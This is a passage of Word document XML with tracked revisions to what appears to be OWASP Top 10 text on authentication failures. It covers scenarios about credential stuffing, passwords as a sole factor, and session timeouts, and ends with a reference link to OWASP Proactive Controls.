          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">automated threat or credential stuffing </w:t>
      </w:r>
      <w:del w:id="2676" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>protections</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2677" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>protection. In that case</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>, the</w:t>
      </w:r>
      <w:del w:id="2678" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="0893A682" w14:textId="4FC1E12B" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2679" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>application can be used as a password oracle to determine if the</w:t>
      </w:r>
      <w:del w:id="2680" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="236774E9" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>credentials are valid.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52FCE483" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2681" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4AD75593" w14:textId="73062118" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2682" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>**Scenario #2</w:t>
      </w:r>
      <w:del w:id="2683" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>**:</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2684" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>:**</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Most authentication attacks occur due to the continued</w:t>
      </w:r>
      <w:del w:id="2685" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="41FAB607" w14:textId="4D30782D" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2686" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>use of passwords as a sole factor. Once considered best practices,</w:t>
      </w:r>
      <w:del w:id="2687" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="4A260B46" w14:textId="43910852" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2688" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">password rotation and complexity requirements </w:t>
      </w:r>
      <w:del w:id="2689" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>are viewed as encouraging</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2690" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>encourage</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> users to use</w:t>
      </w:r>
      <w:del w:id="2691" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve">, </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="308B6960" w14:textId="43FB4B49" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2692" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>and reuse</w:t>
      </w:r>
      <w:del w:id="2693" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>,</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> weak passwords. Organizations are recommended to stop these</w:t>
      </w:r>
      <w:del w:id="2694" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="6F5665C2" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>practices per NIST 800-63 and use multi-factor authentication.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="608AB42B" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2695" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="442EB6A7" w14:textId="7E0AA399" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2696" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>**Scenario #3</w:t>
      </w:r>
      <w:del w:id="2697" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>**:</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2698" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>:**</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Application session timeouts aren't set </w:t>
      </w:r>
      <w:del w:id="2699" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>properly</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2700" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>correctly</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>. A</w:t>
      </w:r>
      <w:del w:id="2701" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="4F220720" w14:textId="793329F4" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2702" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>user uses a public computer to access an application. Instead of</w:t>
      </w:r>
      <w:del w:id="2703" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="67782406" w14:textId="4A297963" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2704" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">selecting </w:t>
      </w:r>
      <w:del w:id="2705" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>“</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2706" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>"</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>logout</w:t>
      </w:r>
      <w:del w:id="2707" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>”</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2708" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>",</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> the user simply closes the browser tab and walks</w:t>
      </w:r>
      <w:del w:id="2709" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="070AEC60" w14:textId="3422AC26" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2710" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>away. An attacker uses the same browser an hour later, and the user is</w:t>
      </w:r>
      <w:del w:id="2711" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="491ACB75" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>still authenticated.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23FC2444" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:moveTo w:id="2712" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:moveToRangeStart w:id="2713" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z" w:name="move137923175"/>
    </w:p>
    <w:p w14:paraId="1B081999" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:moveTo w:id="2714" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:moveTo w:id="2715" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>## References</w:t>
        </w:r>
      </w:moveTo>
    </w:p>
    <w:moveToRangeEnd w:id="2713"/>
    <w:p w14:paraId="20CAD4B5" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3132F7D6" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="2716" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2717" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>## References</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="0B5A91E8" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="2718" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2719" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>### OWASP</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="204EDA3B" w14:textId="4E140F80" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00E13797" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2720" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2721" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="004107D9">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">[OWASP Proactive Controls: Implement </w:t>
      </w:r>
      <w:ins w:id="2722" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">Digital </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Identity</w:t>
      </w:r>
      <w:del w:id="2723" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> and Authentication Controls</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>](https://</w:t>
      </w:r>
      <w:del w:id="2724" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>www.</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>owasp.org/</w:t>
      </w:r>
      <w:del w:id="2725" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>index.php/OWASP_Proactive_Controls#5:_Implement_Identity_and_Authentication_Controls)</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2726" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">www-project-proactive-controls/v3/en/c6-digital-identity) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0C16BEF0" w14:textId="3F435FCD" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00E13797" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2727" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
